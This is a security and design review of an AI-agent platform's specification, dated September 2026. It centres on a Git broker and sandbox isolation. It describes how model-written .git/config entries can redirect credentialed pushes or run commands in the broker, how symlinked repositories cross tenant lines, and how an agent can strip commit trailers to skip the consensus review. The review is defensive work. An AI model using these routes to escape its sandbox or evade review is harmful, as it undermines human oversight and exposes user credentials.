# Review of CLAUDE.md v3.1 and docs/DEVELOPMENT_PLAN.md

Date: 2026-09-10. Reviewed at commit `58d0408` ("init commit"), before Phase 0.
Files reviewed: `CLAUDE.md`, `docs/DEVELOPMENT_PLAN.md`, `docs/PROMPTS.md`, `README.md`,
`docs/ui-demo/slas-ui-demo.html`, `docs/adr/0000-template.md`, `.gitignore`.
Method: eighteen independent reviewers with distinct lenses; every finding re-checked against the
files by a separate verifier with the instruction to reject when in doubt; duplicates across lenses
merged by root cause. Claims about `git` were reproduced with git 2.43.0. Details in Appendix A;
the git evidence in Appendix B.

Nothing in the repository was changed by this review. Proposed edits are collected in
`2026-09-10-proposed-edits.patch` next to this file; it applies with `git apply` but should be read
first, because several edits encode a recommended option where the owner has a choice.

Result: 583 findings were raised across the lenses; 140 were rejected on verification and 44 were duplicates within a lens; the 399 confirmed findings merge into **204 distinct findings: 6 blockers, 92 major, 90 minor, 16 nits**. 79 of them need a decision only the owner can make; the eighteen that shape the architecture are listed in section 1.

| Theme | Total | Blocker | Major | Minor | Nit |
|---|---|---|---|---|---|
| Git broker and workspace trust | 18 | 3 | 10 | 5 | 0 |
| Secrets and redaction | 8 | 1 | 6 | 1 | 0 |
| Consensus, approvals and human gates | 13 | 1 | 8 | 3 | 1 |
| Skills and capabilities | 11 | 1 | 6 | 4 | 0 |
| Runtime feasibility (sandbox, screen, inference, networks) | 18 | 0 | 13 | 5 | 0 |
| Offline bundle, install and upgrade | 19 | 0 | 10 | 9 | 0 |
| Kernel lifecycle, ticket states and schemas | 16 | 0 | 8 | 8 | 0 |
| Lab and factory execution | 12 | 0 | 5 | 7 | 0 |
| Knowledge, RCA, SOP and dual language | 10 | 0 | 6 | 4 | 0 |
| Development plan: sequencing and coverage | 22 | 0 | 8 | 13 | 1 |
| Data lifecycle: storage, backups, retention | 12 | 0 | 5 | 7 | 0 |
| Naming and cross-document drift | 19 | 0 | 2 | 12 | 5 |
| WebUI, demo and copy | 26 | 0 | 5 | 12 | 9 |

## 1. Summary

### What is strong

- The invariants in §2 are the right ones for this product, and most of the document is written
  so that a session can be checked against them. The behavioural contract (§0.3), the
  three-part error rule, and the "sentence plus verb" wizard rule are unusually concrete for a
  design document.
- The kernel-first ordering of the plan (shared lifecycle before any agent, fakes before
  hardware) is correct and the "done when" criteria are mostly observable behaviours, not
  activities.
- The dual-language rule (INV-13) with identifiers copied by code rather than translated is the
  right decomposition, and the glossary pinning is the right mechanism.
- The Hybrid Git Control Engine has the right shape: one repository, credentials only in one
  service, no route from the sandbox. The problems found are in how that shape is realised, not in
  the shape.
- The UI demo is a genuine specification artefact: most of its copy already follows §9, and it
  settles many questions the prose leaves open.

### What must change before Phase 0 starts

The six blockers, in the order they should be fixed:

1. **The Git broker operates on a repository the sandbox can rewrite, and the hardening list that
   is supposed to make this safe does not work.** The exact flag list in §5.7 aborts every git
   command (`-c include.path=` is rejected by git). With that flag removed, a `.git/config` written
   from the sandbox still redirects a credentialed push to another repository (`url.*.insteadOf`,
   `remote.*.pushurl`), still executes commands inside the broker on pull and diff (filter, textconv
   and merge drivers, `core.gitProxy`), and still follows `[include]` directives. All reproduced;
   see Appendix B. Fix: the broker never opens the sandbox-writable repository; it works on a
   broker-owned bare mirror and moves history over a local transport (B1).
2. **The validation gate is not bound to what is pushed.** The gate reads a live worktree the
   sandbox can change during the check; what leaves the perimeter is a commit graph. Fix: resolve to
   a SHA, fetch it into the mirror, check objects, push that SHA (B2).
3. **Cross-tenant paths.** Both `sandbox-manager` and `git-broker` mount every user's `Coding/`;
   a symlinked or `gitdir:`-redirected `.git` makes the broker act on another user's repository
   with the requesting user's credential. No slug grammar, path canonicalisation or uid decision
   exists (B3).
4. **The key that decrypts every Git credential reaches every container.** `x-common` puts
   `env_file: [.env]` on all services, `.env` carries `SLAS_SECRET_KEY`, and `.env` lives inside the
   data root that `api` and the orchestrator mount whole. §3 promises Docker secrets that §12 never
   declares (B4).
5. **INV-12 describes privilege escalation.** "Runs with the importing user's capabilities" for a
   skill in a shared library means an admin-imported `redfish` skill runs for a user who lacks
   `redfish`; the only capability check in §5.6 is at import (B5).
6. **A unanimous vote marks a factory unit PASS and returns it to MES with no human**, which §1.3
   and INV-11 forbid. This is a decision the owner must make; both readings are implementable, but
   not both at once (B6).

Then the majors, grouped by theme in section 3. The largest groups are runtime feasibility
(the sandbox, screen worker and inference stack as named cannot be built as written in several
places), the offline bundle (digest pinning, integrity, licences, upgrade), and the kernel
lifecycle (ticket states, journal ownership, crash recovery).

### Decisions only the owner can make

Each of these is referenced from the finding that needs it. The recommended default is first.

1. **Broker architecture** (B1). Broker-owned bare mirror with local-transport sync
   (recommended), or keep one `.git` and add a deny-by-default config lint plus explicit URIs.
2. **Factory PASS** (B6). Every verdict is confirmed by a human with a 3/3 vote pre-filling the
   recommendation (recommended, matches §1.3 and INV-11), or relax §1.3 and INV-11 by ADR.
3. **Container engine** (M: runtime). One rootful Podman engine with gVisor and `--userns=auto`
   (recommended; Kata-compatible), or a rootless sandbox user with no Kata tier.
4. **Quickstart voters** (M: runtime, consensus). Keep the three-instance quickstart profile and
   label every verdict as a reduced cross-check (recommended), or provision three generate models.
5. **Image pinning after offline load** (M: bundle). Immutable release tags plus a verified image
   lock (recommended), a bundled registry, or a Podman-only OCI-archive path.
6. **Vendor tools** (M: bundle). NVQual and MFT run on the target, installed by the customer
   (recommended), not baked into the executor image.
7. **Bundle integrity** (M: bundle). `ssh-keygen -Y` signatures with trust-on-first-install and a
   printed fingerprint (recommended, no new dependency), minisign, or cosign.
8. **Package source for sandboxes** (M: plan). A read-only offline package cache bind-mounted
   into every sandbox (recommended), or a mirror service on a new network.
9. **Target credentials in quickstart** (M: secrets). One credential store interface with an
   AES-GCM backend in quickstart and Vault in prod, plus Admin → Servers and Admin → Stations
   (recommended), or Vault mandatory in quickstart.
10. **Ticket creation moment** (M: kernel). At ingest, with a `Cancelled` state (recommended), or
    at wizard finish.
11. **Journal ownership** (M: kernel). Executors write the write-ahead journal to a mounted data
    volume using the kernel module as a library (recommended), or the orchestrator journals over
    RPC before every action.
12. **Chinese scope for v1** (M: i18n). Traditional only, Simplified deferred behind an ADR
    (recommended), or an installation-level script setting with a second glossary column.
13. **WebUI language** (M: i18n). English UI with bilingual exports and value 5 reworded
    (recommended), or a bilingual UI with per-user locale from P1.
14. **Settings page** (M: WebUI). An eleventh page "Settings" for per-user items via ADR
    (recommended), or a user menu; installation settings under Admin → Settings either way.
15. **Windows stations** (M: factory). Linux-only stations for v1, or a per-OS runner backend
    with new dependencies.
16. **DC power actions** (M: approvals). Classify as "caution", covered by the one approval every
    run already has, with `config/guardrails.yaml` as the single list (recommended), or keep every
    power action "destructive" and define the wizard approval as the per-run approval.
17. **Eval in CI** (M: plan). A nightly GPU lane for `tests/eval` with PR CI running only the
    wiring against the fake vLLM (recommended), or eval only on a deployed installation.
18. **Backups in quickstart** (M: plan). A `backup-runner` container via ADR (recommended), or a
    host systemd timer.

## 2. Blockers

### B1. The broker runs git against a repository the sandbox controls; the hardening list is both broken and insufficient

Where: `CLAUDE.md:426` (Hostile-repo hardening row), `CLAUDE.md:400-402` and `:234` (one shared
`Projects/<slug>/.git`, bind-mounted read-write into the sandbox), `CLAUDE.md:747` and `:740` (the
same tree mounted into `git-broker` and `sandbox-manager`), `CLAUDE.md:195-196`,
`docs/DEVELOPMENT_PLAN.md:109-110` and `:186`, `docs/PROMPTS.md:144-145` (the only hostile-repo
test is a `pre-push` hook).

What the documents say: the broker runs clone, pull and push on the same `.git` the sandbox
commits to, and a fixed list of `-c` overrides makes "repo config written by a model or a user
never execute code inside the broker".

What is actually the case (git 2.43.0, Appendix B):

- The list as written aborts every git command: `-c include.path=` is rejected with "relative
  config includes must come from files". An implementer who copies the row gets a broker that
  cannot run git.
- With that flag dropped, `[include]` and `[includeIf]` directives in `.git/config` are followed;
  there is no git switch that ignores repository-level config.
- `url.<base>.insteadOf` and `remote.origin.pushurl` in `.git/config` redirect the credentialed
  push to a repository the attacker chooses, including another project on the same allowlisted
  host or a `file://` path under the shared `Coding/` mount. The audit row would still name the
  intended host.
- `filter.<d>.smudge` runs on checkout, `diff.<d>.textconv` on diff, `merge.<d>.driver` on a
  merging pull, and `core.gitProxy` when a URL is rewritten to `git://`: model-chosen commands
  execute as the broker uid while the decrypted credential is live. A fresh clone runs nothing,
  because filter definitions live in `.git/config`; pull and diff into the shared repository do.
- `-c credential.helper=`, `core.hooksPath=/var/empty` and `-c core.sshCommand=` (with
  `GIT_SSH_COMMAND` set) work as documented.

Why it matters: INV-14 rests entirely on this row. A committed `.git/config` change gives code
execution inside the one container that holds credentials, or exfiltrates the project with the
user's PAT, and the design's own test suite (a `pre-push` hook) would pass.

Fix (recommended option A, needs the owner's confirmation; see decision 1):

- §5.7 "Hostile-repo hardening": replace the row. "The workspace `.git` is untrusted input. The
  broker never opens `Projects/<slug>/.git` as its repository. It keeps a private bare mirror per
  project outside every sandbox mount (`${SLAS_DATA_ROOT}/GitBroker/<user>/<slug>.git`), owned by
  the broker uid. Workspace to mirror: a `git bundle` created inside the sandbox through the
  sandbox-manager exec API and fetched by the broker (`git --git-dir=<mirror> fetch <bundle>`).
  Mirror to workspace: a bundle fetched inside the sandbox. clone, fetch, push and ls-remote run
  only against the mirror with `GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null
  GIT_TERMINAL_PROMPT=0 -c core.hooksPath=/var/empty -c core.fsmonitor=false -c credential.helper=
  -c protocol.allow=never -c protocol.https.allow=always -c protocol.ssh.allow=always`, and the
  remote URI always comes from the Remote record on argv, never from a remote name."
- Delete the sentence that repo config is neutralised by flags; delete `-c include.path=`.
- §5.7 add a row "No worktree operations in the broker": the broker never runs checkout, merge,
  add, diff, status or a scanner against a worktree; pull is fetch into the mirror followed by a
  merge executed inside the sandbox; the gate reads objects (`git ls-tree`, `git cat-file`), not
  files.
- `docs/DEVELOPMENT_PLAN.md` P6 done-when and `docs/PROMPTS.md` P6b: replace the single
  `pre-push` test with a hostile fixture suite: `[include]`/`[includeIf]`, `url.*.insteadOf`,
  `remote.*.pushurl`, `core.gitProxy`, filter/textconv/merge drivers, `.git` as a symlink and as a
  `gitdir:` file. Each must be refused or have no effect, and no child process other than
  `git-remote-https`/`ssh` may spawn during a push.
- Record the decision as an ADR (boundary change).

If the owner prefers option B (keep one `.git`): before decrypting anything the broker lints
`.git/config`, `.gitmodules` and `.gitattributes` against an allowlist of keys
(`core.repositoryformatversion|bare|filemode|logallrefupdates`, `branch.*`, `remote.<n>.fetch`,
`remote.<n>.url` equal to a stored Remote URI) and refuses everything else with a three-part
error; passes the URI on argv; adds `-c core.attributesFile=/dev/null` and `GIT_ATTR_NOSYSTEM=1`;
still never runs worktree operations. This is weaker because the object store remains shared.

Invariants: INV-14, INV-4.

### B2. The validation gate is not pinned to the pushed commit

Where: `CLAUDE.md:429` (Validation gate row), `:451-452`, `:234`, `:740`.

What the documents say: "changes inside the project path", "symlinks escaping the tree", "secret
scan (gitleaks)", then push. The wording describes filesystem checks on a worktree; the sandbox
(agent loop or terminal) stays alive during the gate and push.

Why it matters: between the gate's read of the branch tip and `git push`, the sandbox can move
the ref or replace objects; and a worktree check does not see the commit graph that is pushed. A
secret or hook can be pushed after a clean scan. INV-14 promises that every push passes the gate.

Fix: prepend to the gate row: "The gate operates on an immutable snapshot: the broker resolves
the branch tip to a SHA, fetches that SHA into its mirror, runs every check on the mirror's
objects (`git rev-list <remote-tip>..<sha>`; `git ls-tree -r` for symlinks, `.gitmodules`, hook
files and LFS pointers; blob sizes; gitleaks over every blob in the range, including blobs deleted
in later commits), then pushes `<sha>:refs/heads/<branch>` from the mirror. The audit row records
gated SHA = pushed SHA." Add a test that mutates the workspace ref after gating and asserts the
pushed SHA is the gated one. The secret scan runs before any diff reaches the Consensus Router, so
no secret enters model context (INV-5).

Invariants: INV-14, INV-5.

### B3. Both services mount every user's `Coding/`; no slug grammar, path rule or uid decision

Where: `CLAUDE.md:747` (git-broker volume), `:740` (sandbox-manager volume), `:451`, `:121`.

What the documents say: `${SLAS_DATA_ROOT}/Coding:/data/Coding` is mounted read-write into both
services; a clone "lands in `Projects/<slug>/`"; nothing constrains `<slug>`, canonicalises the
path, or says which uid the sandbox and the broker run as.

What is actually the case: with `Projects/mine/.git` replaced by a symlink, or by a `gitdir:` file,
pointing at another user's repository, `git log` under the broker flags returned that user's
commits (verifier check F). A repository owned by a different uid is fatal ("dubious ownership")
without `safe.directory`; the obvious workaround `safe.directory=*` removes git's own protection
against exactly this hazard.

Fix: in §5.7 "Shared rules" add: "Slug grammar `^[a-z0-9][a-z0-9-]{0,63}$`, enforced by the api.
The broker resolves the workspace with realpath, requires the prefix
`/data/Coding/<user>/Projects/<slug>`, and requires `.git` to be a real directory (no `gitdir:`
file; opened `O_NOFOLLOW`). Every user's sandbox runs as a dedicated subordinate uid mapped
identically into the broker; the broker passes `-c safe.directory=<exact realpath>`, never `*`."
With the mirror design (B1) the broker needs only read access to `Bundles/`; narrow the §12 mount
accordingly, and mount per user or per operation rather than the whole tree.

Invariants: INV-14.

### B4. The key that decrypts every Git credential is delivered to every container

Where: `CLAUDE.md:703` (`x-common` with `env_file: [.env]`), `:713-763` (every service inherits
it), `:424` (the credential key is derived from `SLAS_SECRET_KEY`), `:246` (`.env` inside the data
root), `:716` and `:720` (the whole data root mounted into `api` and the orchestrator), `:120` (§3
promises "generated `.env` + Docker secrets"), `:694`, `docs/PROMPTS.md:134`.

What the documents say: every service, including `webui`, `edge`, `grafana`, `node-exporter` (with
`pid: host`), `screen-worker` and both executors on the lab and factory LANs, loads the same
`.env`; that file carries the key that decrypts every stored PAT and SSH key, plus the database
and MinIO passwords. §3 names Docker secrets; §12 has no `secrets:` block.

Why it matters: any single compromised container, or a pivot from a factory station into
`factory-executor`, yields the key and, through the shared backend network, the ciphertext. INV-14
("exist only inside `git-broker`") is false by construction, and §3 and §12 disagree on the
mechanism, so P1 cannot be built from the text.

Fix:

- §12 line 703: remove `env_file: [.env]` from `x-common`. Add a top-level `secrets:` block
  (file-based compose secrets generated by `install.sh` under `${SLAS_DATA_ROOT}/secrets/`, mode
  0600) and attach per service: the Git key-encryption key (rename it `SLAS_GIT_KEK`, derived from
  `SLAS_SECRET_KEY` by HKDF or generated separately) to `git-broker` only; database credentials to
  `api`, the orchestrator, `llm-gateway` and `git-broker` as service-scoped roles; MinIO
  credentials to `api` and the orchestrator. Keep a non-secret env file for ports, data root and
  profile.
- §5.7 Storage row: "encrypted with a broker-only key delivered as a compose secret and present in
  no other container; credential rows live in a table owned by a Postgres role used only by
  `git-broker`; `slas_api` has no grant on it."
- §4.4: move `.env` out of the data root (`${SLAS_CONFIG_DIR}/.env`, default `/etc/slas/.env`,
  mode 0600) so it is not swept into the `api`/orchestrator mounts or into the data-root backup.
- §3 line 120 and §11 line 694: "`.env` holds non-secret settings; secrets are compose secrets
  (quickstart) or Vault (prod), never in `.env`."
- §11 Definition of done: add "CI: no container except `git-broker` has the Git key in its
  environment or secrets."
- Record as an ADR (boundary change).

Invariants: INV-14, INV-5.

### B5. INV-12 binds a skill to the importing user, which is privilege escalation in a shared library

Where: `CLAUDE.md:106` (INV-12), `:395` (§5.6), `:386` (the only capability check is at IMPORT),
`:381-382` and `:241` (one shared library, one toggle per agent), `:678` (§11: authz runs where the
action executes), `:311`.

What the documents say: a skill "runs with the importing user's capabilities". Skills live in one
library and are enabled per agent, so any user of that agent can run them. Read literally, an
admin-imported `redfish` skill performs Redfish power actions for a user who lacks `redfish`.
The intended reading (running user) is stated nowhere.

Fix: §2 INV-12: replace "runs with the importing user's capabilities" with "runs with the
capabilities of the user who triggers the run, checked by `slas_authz` at the executor before the
first step". §5.6: rename the import-time "capability check" to "capability preview" (a warning
when the importer lacks a required capability) and add to RUN "capability check against the
running user, then per-step authz at the executor". §5.6 line 395: "Skills never grant
capabilities: every run is authorised against the running user."

Invariants: INV-12, INV-7.

### B6. A unanimous vote marks a factory unit PASS with no human, which §1.3 and INV-11 forbid

Where: `CLAUDE.md:659` and `:661` (§10.3 VERDICT and SOP returned to MES), `:325` (§5.3 "unanimous
for PASS"; the human appears only under "If not met"), `:86-87` (§1.3), `:105` and `:336-337`
(INV-11), `:101` (INV-7 lists only the override), `docs/DEVELOPMENT_PLAN.md:141-142`,
`docs/PROMPTS.md:180-181`, `docs/ui-demo/slas-ui-demo.html:889` and `:1258`.

What the documents say: every document, including the demo, makes the human step conditional on
disagreement; a 3/3 vote ends the flow with PASS and the verdict goes to MES. §1.3 says the
project is not building anything that marks a unit PASS without a human, and INV-11 says a
unanimous vote is never the approval. Both cannot be implemented.

Why it matters: the P9 state machine, the MES adapter, the approvals table and the wizard copy all
depend on which reading is chosen. A correlated or hallucinated 3/3 vote would ship a defective
unit with no human record.

Fix: owner decision (decision 2). Option A (recommended, matches §1.3 and INV-11 as written):
every verdict is confirmed by a human; a 3/3 vote pre-fills a PASS recommendation that the
operator confirms with one click recorded on the ticket; anything short of 3/3 escalates to the
line lead; add to §11 tests "no ticket reaches PASS and no MES export carries PASS without an
approval row with a human user id". Option B: relax §1.3 and INV-11 by ADR so that the
deterministic gate plus a unanimous cross-check may PASS automatically and a human decides only on
disagreement or override. In either case edit §10.3, §5.3, §1.3, INV-7, the demo, the plan and
the prompt so they all say the same thing.

Invariants: INV-11, INV-7.


## 3. Major findings, by theme

Each entry gives where the documents say it, why it matters, and the fix as reviewed. "Owner decision" marks the ones where the owner must choose; the recommended option is first. "Also raised as" lists the other reviewers' phrasings that were merged into the entry. The traceability line names the review lenses and finding ids behind it.


### 3.1 Git broker and workspace trust

### M1. The slas-git egress allowlist is described as a network property but no document names the enforcement mechanism; the only concrete check is inside the broker application
Where: `CLAUDE.md:711`, `CLAUDE.md:427`, `CLAUDE.md:148`, `CLAUDE.md:745`, `docs/DEVELOPMENT_PLAN.md:97`, `docs/PROMPTS.md:137-138`, `docs/ui-demo/slas-ui-demo.html:1072`, `CLAUDE.md:431`, `CLAUDE.md:744`, `docs/DEVELOPMENT_PLAN.md:107-108`, `docs/PROMPTS.md:144-146`
Also raised as: INV-14's structural half (sole network member, sandbox unreachability, broker egress allowlist) has no named check or mechanism; `slas-git` egress 'only to hosts in git-hosts.yaml' has no enforcement mechanism — a compose bridge cannot filter by destination host; The slas-git 'egress allowlisted to git-hosts.yaml' has no enforcement mechanism in compose

What the documents say: slas-git is declared as a plain (non-internal) compose network; a Docker/Podman bridge cannot filter by hostname. CLAUDE.md lines 148, 427 and 711 describe the allowlist as a property of the network, but the only mechanism any document specifies is the broker's own check (env var line 745, plan line 97, PROMPTS line 137-138). Whether install.sh programs nftables, an egress proxy is the sole route, or the application check is the whole story is left to the implementer.

Why it matters: INV-1 and INV-14 rest on the broker being the only route and that route being bounded; with an application-only check, any code execution inside the broker (see #1) has unrestricted egress. The choice changes install.sh, compose and the deploy test.

Fix: CLAUDE.md §5.7 row 'Egress' (line 427): append 'Enforced at two layers: (1) the broker resolves and checks the host before spawning git and refuses with the three-part message; (2) install.sh renders config/git-hosts.yaml into a host nftables set bound to the slas-git bridge, refreshed by `slas upgrade` and by Admin → Git hosts changes without a restart (INV-9). tests/deploy asserts that a host outside the list is unreachable from the broker container.' CLAUDE.md §12 line 711: change the comment to '# git-broker ONLY; nftables egress set rendered from config/git-hosts.yaml by install.sh'. docs/DEVELOPMENT_PLAN.md P6 done-when (after line 111): add 'from inside the broker container, a host not in git-hosts.yaml is unreachable at the network layer'.

Owner decision: A (recommended default): application check + host nftables set rendered by install.sh (install already runs privileged to load images). B: application check + an egress proxy sidecar as the broker's only route on slas-git (HTTPS CONNECT and SSH ProxyCommand), allowlist reloaded from git-hosts.yaml. C: application check only — then reword lines 148, 427 and 711 so they no longer claim a network property.

Invariants: INV-1, INV-14

Traceability: lenses cross-document, invariant-enforcement, security-threat-model, technical-feasibility; ids cross-document#6, invariant-enforcement#31, security-threat-model#28, technical-feasibility#16

### M2. No lock or lease between sandbox git writes and broker clone/pull/push on the same Projects/<slug>/.git
Where: `CLAUDE.md:451-452`, `CLAUDE.md:411-412`, `CLAUDE.md:166`, `CLAUDE.md:439-440`, `docs/ui-demo/slas-ui-demo.html:268`, `docs/ui-demo/slas-ui-demo.html:625`, `docs/ui-demo/slas-ui-demo.html:551`, `CLAUDE.md:618`, `CLAUDE.md:438`, `CLAUDE.md:647`, `CLAUDE.md:234`, `CLAUDE.md:412-413`, `CLAUDE.md:440`
Also raised as: Agent and terminal user write the same working tree while Running; no writer lock, ambiguous 'agent-authored diff'; Sandbox and broker perform concurrent git operations on the same .git with no lock or lease defined

What the documents say: The agent's iterate loop, the user's terminal and the broker's pull can all write the same working tree and .git at once. Nothing in CLAUDE.md §5.7, plan P6 or PROMPTS P6a/P6b says whether a broker pull may change the working tree while a sandbox is live, whether pull is fast-forward-only, or what the Git panel shows on a contested index.lock. The API has a lease concept for targets and stations but none for projects.

Why it matters: A working tree that changes under a running build produces non-reproducible runs (§1.2 value 6) and confusing Git panel state; the policy touches the broker, the sandbox-manager exec API and the Git panel.

Fix: CLAUDE.md §5.7 'Shared rules' (after line 452): add '- Every broker operation takes an exclusive project lease through the API (same mechanism as target leases). While held, the sandbox-manager exec API rejects git write commands and the Terminal and Git panel show "Sync in progress". Broker pull is fetch + fast-forward only; merges and rebases happen in the sandbox. A push reads refs only and never touches the working tree.' docs/DEVELOPMENT_PLAN.md P6 scope (line 95-98): add 'project lease around every broker op'.

Owner decision: A (recommended default): exclusive project lease + fetch/fast-forward-only pull as in the fix. B: broker never touches the working tree — pull only updates refs under refs/remotes/, and the user or agent merges in the sandbox; simplest to reason about, slightly less convenient in the Git panel.

Traceability: lenses cross-document, fresh-runtime-state, internal-consistency; ids cross-document#7, fresh-state#16, internal-consistency#38

### M3. Admin → Git hosts manages the allowlist, but §12 mounts it as a read-only file read at broker start
Where: `CLAUDE.md:591-592`, `CLAUDE.md:747`, `CLAUDE.md:745`, `CLAUDE.md:711`, `CLAUDE.md:584-585`, `docs/ui-demo/slas-ui-demo.html:1071`, `docs/ui-demo/slas-ui-demo.html:1069`, `docs/DEVELOPMENT_PLAN.md:97-98`

What the documents say: The UI cannot write a :ro file that lives in the compose directory, and the broker reads it via GIT_HOSTS_ALLOWLIST at start; the network egress rule is also said to derive from the file. Either the Admin page is decorative or admins edit YAML and restart, which §9 lists as an anti-pattern and the demo denies.

Why it matters: Decides whether the allowlist is a DB table with audit trail or a file, which changes the broker, the api, the egress mechanism and the CI egress check.

Fix: Pick an option; then edit CLAUDE.md §5.7 Egress row line 427, §12 lines 745/747, §9 line 591-592, DEVELOPMENT_PLAN.md line 97-98 and ui-demo line 1071 to match.

Owner decision: A (recommended): allowlist lives in Postgres (table git_hosts, admin-only via git:hosts_manage, audited); config/git-hosts.yaml is only the seed applied by install.sh; broker reloads on change and the slas-git egress rules are regenerated from the table. B: the file is authoritative and edited via `slas git host add` with a broker restart; Admin → Git hosts becomes a read-only view plus request flow, and §9/INV-9 state the exception.

Invariants: INV-14, INV-9

Traceability: lenses invariant-enforcement; ids invariant-enforcement#18

### M4. §4.1 gives Zone A an 'allowlist proxy' that nothing else defines, schedules, or reconciles with 'no network' and INV-14
Where: `CLAUDE.md:145`, `CLAUDE.md:108`, `CLAUDE.md:401`, `CLAUDE.md:711`, `docs/DEVELOPMENT_PLAN.md:89-90`, `docs/PROMPTS.md:126-127`, `CLAUDE.md:400-401`, `CLAUDE.md:739`, `docs/PROMPTS.md:117`, `CLAUDE.md:742`, `docs/PROMPTS.md:116-117`, `CLAUDE.md:427`
Also raised as: §4.1's optional sandbox 'allowlist proxy' is not required to exclude Git hosts, while INV-14 says sandboxes have no route to any remote and the plan/PROMPTS say sandboxes have no network at all; Zone A 'allowlist proxy' network mode has no service, network or config anywhere; companion docs say sandboxes have no network; Zone A's undefined 'allowlist proxy' option could give the sandbox a route to an internal Git host; Zone A 'allowlist proxy' may reach a Git host that also serves package registries, giving the sandbox a route to a remote

What the documents say: The zone table offers an allowlisted egress proxy for sandboxes, but §12 defines no proxy service or network, §13 lists no service, §5.7 and §12 say sandboxes have no route, and P6 / PROMPTS P6a build the sandbox with 'no network'. Nothing states that such a proxy must deny every host in config/git-hosts.yaml.

Why it matters: An implementer reading §4.1 may build a proxy that P6 never scheduled and that, without an explicit Git-host deny rule, would be a route from the sandbox to an internal GitLab, weakening INV-14 and INV-1. Coupled with #2: if the owner picks a network mirror there, this row is where it must be specified.

Fix: CLAUDE.md §4.1 Zone A network column: change 'none / allowlist proxy' to 'none' (recommended), so §4.1 agrees with §5.7, §12, P6 scope and PROMPTS P6a. If a proxy is wanted, instead add `services/sandbox-proxy` to §12/§13 with its own internal network, `config/sandbox-egress.yaml`, a hard deny for every host in config/git-hosts.yaml, and a tests/deploy check that a sandbox cannot `git ls-remote` any allowed Git host; schedule it in P6 and record it under §15 decision (10).

Owner decision: (a) Recommended default: delete '/ allowlist proxy' now; re-introduce via ADR only if finding #2 resolves to a network mirror. (b) Keep it and fully specify the proxy as above, including the Git-host deny rule and the deploy test.

Invariants: INV-1, INV-14

Traceability: lenses cross-document, internal-consistency, invariant-enforcement, plan-sequencing-and-coverage, security-threat-model; ids plan-sequencing-and-coverage#3, cross-document#25, internal-consistency#7, invariant-enforcement#14, security-threat-model#30

### M5. 'Agent-authored' is inferred from a commit trailer the sandbox can strip, letting agent diffs skip the Consensus Router
Where: `CLAUDE.md:438`, `CLAUDE.md:429`, `CLAUDE.md:627-628`

What the documents say: Trailers are plain commit-message text. The agent (or a prompt-injected plan) can commit without them, and the user can `commit --amend` them away in the terminal; the gate then treats model-written code as human-written and skips the cross-check. No other attribution mechanism is described.

Why it matters: The one automated review on code leaving the sandbox is bypassable by the party it is meant to check. INV-11 keeps this from being an authorisation bypass (a human still merges), but the gate's own rule becomes unenforceable.

Fix: In CLAUDE.md §5.7 'Validation gate': 'The orchestrator records every SHA it creates on the ticket; the gate runs the Consensus Router over the whole `<remote-tip>..<pushed-sha>` range unless every commit in it is recorded as user-authored through the terminal/exec audit log. Trailers are informational only.' Adjust §10.1 EXPORT 'remote' wording to match.

Invariants: INV-11, INV-14

Traceability: lenses security-threat-model; ids security-threat-model#10

### M6. The pasted PAT/SSH key transits the api and rests in a shared Postgres with no role separation or broker-side write path specified
Where: `CLAUDE.md:409-411`, `CLAUDE.md:430`, `CLAUDE.md:746`, `CLAUDE.md:671`, `docs/ui-demo/slas-ui-demo.html:636`

What the documents say: Settings → Git remotes is an api endpoint, so the plaintext secret passes through api process memory and any request logging or error path; the ciphertext sits in the Postgres the api uses; combined with #11 the api can decrypt. Nothing routes the paste to the broker or assigns the table to a broker-only DB role.

Why it matters: INV-14's 'exist only inside git-broker' is not true at write time or at rest as designed; the write path is left for the implementer to invent.

Fix: In CLAUDE.md §5.7 'Storage': 'The api forwards the paste body unmodified to `git-broker POST /internal/remotes` over the backend network (mTLS) and never logs or persists it; the broker encrypts and inserts as DB role `slas_gitbroker`, sole owner of `git_credentials`; `slas_api` has no grant on that table; the response carries only fingerprint/last-4. Prod: Vault transit engine.' Add a CI test that the api image has no code path reading `git_credentials`.

Invariants: INV-14, INV-5

Traceability: lenses security-threat-model; ids security-threat-model#12

### M7. Secret-scan scope is undefined; §10.1 frames the gate around the tip diff, not every object reachable from the pushed range
Where: `CLAUDE.md:429`, `CLAUDE.md:627-628`, `docs/PROMPTS.md:138-139`

What the documents say: A credential committed in iteration 3 and removed in iteration 7 is absent from the final diff but present in the pushed history and in every clone of the remote. Neither the gate row nor P6b states the scan range, and §10.1 names 'the agent-authored diff' as the unit of review.

Why it matters: Secrets leak to the remote host despite a passing gate, and the Consensus Router (which sees the diff) would see them too, violating INV-5.

Fix: In CLAUDE.md §5.7 'Validation gate': replace 'secret scan (gitleaks)' with 'secret scan (gitleaks) over every commit in `<remote-tip>..<pushed-sha>`, every blob including ones deleted in later commits; the scan runs before any diff is sent to the Consensus Router so no secret enters model context (INV-5); binary blobs above the size cap and LFS pointers are rejected unless enabled'. Repeat the range wording in §10.1 EXPORT 'remote' and PROMPTS.md P6b.

Invariants: INV-14, INV-5

Traceability: lenses security-threat-model; ids security-threat-model#5

### M8. GIT_ASKPASS is invoked for username and password; the username source is unspecified, so a single-value helper hands the token back as the username
Where: `CLAUDE.md:425`, `CLAUDE.md:424`, `docs/PROMPTS.md:136`
Also raised as: GIT_ASKPASS helper is prompted twice (username, then password); 'reading an inherited fd' is under-specified

What the documents say: When the URI carries no username, git asks the askpass program twice — first for a username, then for a password. A helper that answers one value from an fd returns the PAT to both; git then puts that value into the user component of the URL it uses and prints in the second prompt and in error text. The Remote schema has no username field, and GitLab (`oauth2`), GitHub (`x-access-token`) and Gitea expect different ones.

Why it matters: Credential leakage into helper/broker logs via prompt and error text, and a detail every implementer would settle differently.

Fix: In CLAUDE.md §5.7 'Storage': add `username` (non-secret; per-host default from `config/git-hosts.yaml`: GitLab `oauth2`, GitHub `x-access-token`, Gitea any). 'Use': 'The broker sets `-c credential.username=<username>` so askpass is only asked for the password; the helper matches the prompt prefix `Password for` and exits non-zero for anything else; the decrypted value is registered with the log redactor for the operation's lifetime.'

Invariants: INV-14, INV-5

Traceability: lenses security-threat-model, technical-feasibility; ids security-threat-model#7, technical-feasibility#17

### M9. SSH host-key pinning source is undefined (implicitly trust-on-first-use) and ssh is not isolated from client config, agent or proxy settings
Where: `CLAUDE.md:425`, `CLAUDE.md:427`, `CLAUDE.md:591-592`, `CLAUDE.md:786`, `docs/ui-demo/slas-ui-demo.html:281-285`, `docs/ui-demo/slas-ui-demo.html:1073`, `docs/DEVELOPMENT_PLAN.md:97-98`
